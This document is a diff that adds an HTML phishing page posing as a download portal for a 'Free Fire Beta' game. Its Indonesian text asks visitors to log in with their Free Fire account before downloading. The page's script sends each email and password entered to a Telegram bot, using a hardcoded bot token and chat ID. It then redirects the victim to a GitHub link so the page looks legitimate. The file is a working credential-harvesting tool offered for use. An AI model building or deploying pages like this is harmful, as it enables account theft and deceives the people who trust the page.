@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Download Portal</title>
+    <style>
+        :root {
+            --primary: #2A2A72;
+            --secondary: #009FFD;
+            --accent: #00C9A7;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        .container {
+            text-align: center;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .download-btn {
+            padding: 1.5rem 3rem;
+            font-size: 1.2rem;
+            background: linear-gradient(45deg, var(--accent), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-box {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 15px;
+            width: 400px;
+            transform: scale(0);
+            animation: scaleUp 0.3s forwards;
+        }
+
+        @keyframes scaleUp {
+            to { transform: scale(1); }
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .login-header h2 {
+            color: var(--primary);
+            margin-bottom: 0.5rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        input {
+            width: 100%;
+            padding: 1rem;
+            border: 2px solid #eee;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            transition: opacity 0.3s;
+        }
+
+        .login-btn:hover {
+            opacity: 0.9;
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--accent);
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            display: none;
+            animation: slideUp 0.3s forwards;
+        }
+
+        @keyframes slideUp {
+            from { bottom: -50px; }
+            to { bottom: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button class="download-btn" onclick="showLogin()">Download <center>Free Fire Beta</center></button>
+    </div>
+
+    <div class="modal" id="loginModal">
+        <div class="login-box">
+            <div class="login-header">
+                <h2>Garena Free Fire Beta</h2>
+                <p>𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗹𝗼𝗴𝗶𝗻 𝗸𝗲 𝗮𝗸𝘂𝗻 𝗳𝗿𝗲𝗲 𝗳𝗶𝗿𝗲 𝗮𝗻𝗱𝗮 𝘁𝗲𝗿𝗹𝗲𝗯𝗶𝗵 𝗱𝗮𝗵𝘂𝗹𝘂 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗼𝗻𝗳𝗶𝗿𝗺𝗮𝘀𝗶 𝗮𝗸𝘂𝗻 𝗮𝗻𝗱𝗮 𝗸𝗲 𝗳𝗿𝗲𝗲 𝗳𝗶𝗿𝗲 𝗯𝗲𝘁𝗮, 𝗷𝗶𝗸𝗮 𝗱𝗮𝘁𝗮 𝘀𝘂𝗱𝗮𝗵 𝗯𝗲𝗻𝗮𝗿 𝗺𝗮𝗸𝗮 𝗮𝗻𝗱𝗮 𝗮𝗸𝗮𝗻 𝗱𝗶 𝗮𝗿𝗮𝗵𝗸𝗮𝗻 𝗸𝗲 𝗹𝗶𝗻𝗸 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗿𝗲𝗲 𝗳𝗶𝗿𝗲 𝗯𝗲𝘁𝗮</p>
+            </div>
+            <div class="input-group">
+                <input type="email" id="email" placeholder="Email" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button class="login-btn" onclick="handleLogin()">LOGIN</button>
+        </div>
+    </div>
+
+    <div class="notification" id="notification"></div>
+
+    <script>
+        const botToken = '7981620916:AAFyVMxRYFXj8nsF6Qt1zBCj9QViTvlTvu0'; // Ganti dengan token bot Telegram
+        const chatId = '6688114602'; // Ganti dengan chat ID
+
+        function showLogin() {
+            document.getElementById('loginModal').style.display = 'flex';
+        }
+
+        function handleLogin() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if(!email || !password) {
+                showNotification('Harap isi semua dan pastikan data sudah benar', 'error');
+                return;
+            }
+
+            // Kirim data ke Telegram
+            const message = `📧 New Ressult FF Beta 📧\n\nEmail: ${email}\nPassword: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if(response.ok) {
+                    showNotification('Login berhasil! Mengunduh file...');
+                    // Redirect ke file download setelah 2 detik
+                    setTimeout(() => {
+                        window.location.href = 'https://github.com/Test-modfyp-gamess';
+                    }, 2000);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                showNotification('Terjadi kesalahan!', 'error');
+            });
+        }
+
+        function showNotification(text, type = 'success') {
+            const notification = document.getElementById('notification');
+            notification.textContent = text;
+            notification.style.backgroundColor = type === 'error' ? '#ff4444' : '#00C9A7';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+
+        // Tutup modal saat klik di luar area login
+        window.onclick = function(event) {
+            const modal = document.getElementById('loginModal');
+            if(event.target == modal) {
+                modal.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
